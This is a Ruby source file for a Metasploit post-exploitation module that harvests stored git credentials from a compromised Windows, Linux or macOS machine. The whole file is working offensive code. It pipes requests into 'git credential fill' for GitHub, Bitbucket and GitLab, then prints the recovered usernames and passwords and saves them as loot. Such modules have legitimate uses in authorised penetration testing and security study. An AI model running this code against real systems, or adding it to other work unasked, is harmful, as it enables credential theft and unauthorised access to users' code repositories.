##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Auxiliary::Report
  include Msf::Post::Windows::Powershell

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Multi Gather Git Credentials Collection',
        'Description' => %q{
          This module will attempt to gather credentials from local git credential helpers on the targeted machine.
          These credentials can typically be used to access code repositories belonging to the user.
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'Mark Adams <mark@markadams.me>' ],
        'References' => [ 'URL', 'https://git-scm.com/docs/git-credential' ],
        'Platform' => %w[linux osx unix win],
        'SessionTypes' => %w[meterpreter]
      )
      )

    register_options([
      OptString.new('REPOSITORY_HOSTS', [true, 'Repository hosts to collect credentials for (comma separated)', 'github.com,bitbucket.org,gitlab.com'])
    ])
  end

  def get_creds_windows(host)
    cmd = "$env:GCM_INTERACTIVE=0; $env:GIT_TERMINAL_PROMPT=0; Write-Output \"protocol=https`nhost=#{host}`n\" | git credential fill; Remove-Item env:GCM_INTERACTIVE; Remove-Item env:GIT_TERMINAL_PROMPT"
    cmd_out, _pids, _channels = execute_script(cmd)
    output = ''
    while (s = cmd_out.channel.read)
      output += s
    end

    output.strip
  end

  def get_creds_unix(host)
    cmd = "echo 'protocol=https\nhost=#{host}\n' | GIT_TERMINAL_PROMPT=0 git credential fill"
    cmd_exec(cmd).strip
  end

  def parse_output(str)
    cred = Hash.new

    str.split(/\r\n|\r|\n/).each do |line|
      next if !line.include? '='

      k, v = line.split('=')
      cred[k] = v
    end

    cred
  end

  def run
    if (session.platform == 'windows') && !have_powershell?
      fail_with(Failure::Unknown, 'PowerShell is not installed')
    end

    cred_table = Rex::Text::Table.new(
      'Header' => 'git repository credentials',
      'Indent' => 1,
      'Columns' =>
        [
          'Host',
          'Username',
          'Password'
        ]
    )

    is_windows = session.platform == 'windows'

    datastore['REPOSITORY_HOSTS'].split(',').each do |host|
      out = is_windows ? get_creds_windows(host) : get_creds_unix(host)
      if out.empty?
        next
      end

      cred = parse_output(out)
      if cred['username'].nil? || cred['password'].nil?
        next
      end

      create_credential({
        origin_type: :session,
        session_id: session_db_id,
        post_reference_name: refname,
        smodule_fullname: fullname,
        username: cred['username'],
        private_data: cred['password'],
        private_type: :password,
        workspace_id: myworkspace_id
      })

      cred_table << [ cred['host'], cred['username'], cred['password'] ]
      print_good("Found #{cred['host']} login (#{cred['username']}:#{cred['password']})")
    end

    if cred_table.rows.empty?
      print_status('No credentials found')
      return
    end

    p = store_loot(
      'git.creds',
      'text/csv',
      session,
      cred_table.to_csv,
      'git_credentials.txt',
      'git repository credentials'
    )

    print_status("Credentials stored in: #{p}")
  end

end
